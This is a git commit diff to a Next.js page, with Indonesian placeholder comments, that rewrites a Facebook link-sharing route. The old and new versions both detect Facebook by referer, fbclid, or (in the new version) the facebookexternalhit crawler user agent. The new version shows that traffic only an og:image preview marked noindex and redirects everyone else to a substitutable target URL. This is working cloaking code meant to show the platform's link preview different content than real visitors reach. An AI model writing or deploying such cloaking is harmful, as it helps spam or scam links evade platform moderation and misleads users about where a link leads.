7903ffaebe86998623fb601fcf025986389afa8b
hyein89 <bihontai@gmail.com>
2025-07-25 11:25:00 +0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -1,113 +1,57 @@
 import React from 'react';
 import Head from 'next/head';
 import { GetServerSideProps } from 'next';
-import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
-	const graphQLClient = new GraphQLClient(endpoint);
-	const referringURL = ctx.req.headers?.referer || null;
-	const pathArr = ctx.query.postpath as Array<string>;
-	const path = pathArr.join('/');
-	console.log(path);
-	const fbclid = ctx.query.fbclid;
+  const pathArr = ctx.query.postpath as string[];
+  const path = pathArr.join('/');
 
-	// redirect if facebook is the referer or request contains fbclid
-	if (referringURL?.includes('facebook.com') || fbclid) {
-		return {
-			redirect: {
-				permanent: false,
-				destination: `${
-					endpoint.replace(/(\/graphql\/)/, '/') + encodeURI(path as string)
-				}`,
-			},
-		};
-	}
-	const query = gql`
-		{
-			post(id: "/${path}/", idType: URI) {
-				id
-				excerpt
-				title
-				link
-				dateGmt
-				modifiedGmt
-				content
-				author {
-					node {
-						name
-					}
-				}
-				featuredImage {
-					node {
-						sourceUrl
-						altText
-					}
-				}
-			}
-		}
-	`;
+  const referer = ctx.req.headers?.referer || '';
+  const userAgent = ctx.req.headers['user-agent'] || '';
+  const isFacebook =
+    referer.includes('facebook.com') ||
+    userAgent.includes('facebookexternalhit') ||
+    ctx.query?.fbclid;
 
-	const data = await graphQLClient.request(query);
-	if (!data.post) {
-		return {
-			notFound: true,
-		};
-	}
-	return {
-		props: {
-			path,
-			post: data.post,
-			host: ctx.req.headers.host,
-		},
-	};
+  const imageUrl = `https://red-cot.vercel.app/${path}.jpg`; // GANTI dengan URL asli gambarmu
+  const redirectTarget = `https://tujuanmu.com/`; // GANTI ke tujuan aslinya
+
+  if (!isFacebook) {
+    return {
+      redirect: {
+        destination: redirectTarget,
+        permanent: false,
+      },
+    };
+  }
+
+  return {
+    props: {
+      imageUrl,
+      canonicalUrl: `https://${ctx.req.headers.host}/${path}`,
+    },
+  };
 };
 
-interface PostProps {
-	post: any;
-	host: string;
-	path: string;
+interface Props {
+  imageUrl: string;
+  canonicalUrl: string;
 }
 
-const Post: React.FC<PostProps> = (props) => {
-	const { post, host, path } = props;
-
-	// to remove tags from excerpt
-	const removeTags = (str: string) => {
-		if (str === null || str === '') return '';
-		else str = str.toString();
-		return str.replace(/(<([^>]+)>)/gi, '').replace(/\[[^\]]*\]/, '');
-	};
-
-	return (
-		<>
-			<Head>
-				<meta property="og:title" content={post.title} />
-				<link rel="canonical" href={`https://${host}/${path}`} />
-				<meta property="og:description" content={removeTags(post.excerpt)} />
-				<meta property="og:url" content={`https://${host}/${path}`} />
-				<meta property="og:type" content="article" />
-				<meta property="og:locale" content="en_US" />
-				<meta property="og:site_name" content={host.split('.')[0]} />
-				<meta property="article:published_time" content={post.dateGmt} />
-				<meta property="article:modified_time" content={post.modifiedGmt} />
-				<meta property="og:image" content={post.featuredImage.node.sourceUrl} />
-				<meta
-					property="og:image:alt"
-					content={post.featuredImage.node.altText || post.title}
-				/>
-				<title>{post.title}</title>
-			</Head>
-			<div className="post-container">
-				<h1>{post.title}</h1>
-				<img
-					src={post.featuredImage.node.sourceUrl}
-					alt={post.featuredImage.node.altText || post.title}
-				/>
-				<article dangerouslySetInnerHTML={{ __html: post.content }} />
-			</div>
-		</>
-	);
+const Page: React.FC<Props> = ({ imageUrl, canonicalUrl }) => {
+  return (
+    <>
+      <Head>
+        <meta property="og:image" content={imageUrl} />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content={canonicalUrl} />
+        <meta name="robots" content="noindex" />
+      </Head>
+      <main style={{ textAlign: 'center', padding: '100px' }}>
+        <h1>Redirecting...</h1>
+      </main>
+    </>
+  );
 };
 
-export default Post;
+export default Page;
